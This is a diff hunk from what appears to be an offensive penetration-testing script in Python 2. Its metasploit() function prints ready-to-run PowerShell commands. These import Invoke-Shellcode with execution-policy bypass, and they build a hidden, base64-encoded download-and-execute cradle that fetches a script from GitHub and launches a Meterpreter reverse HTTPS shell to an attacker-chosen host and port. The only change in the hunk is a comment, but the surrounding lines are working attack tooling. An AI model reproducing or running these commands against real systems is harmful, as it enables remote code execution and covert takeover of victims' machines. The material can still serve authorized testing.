@@ -144,6 +144,7 @@ def metasploit():
     print "\n[*]Run from a local copy of the script:"
     print 'powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-Shellcode.ps1; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost '+ans_lhost+' -Lport '+ans_lport+' -Force}"'
     print "\n[*]Base64 encoded version download and execute:"
+    ##### Here is how to convert powershell into base64 encode which can run directly from cmd####
     x = powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force")
     print "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + x
     print "\n[*]Listner Resource Script (listener.rc) - Save the following to a file called listener.rc on your Kali box and load your handler with msfconsole -r listener.rc"
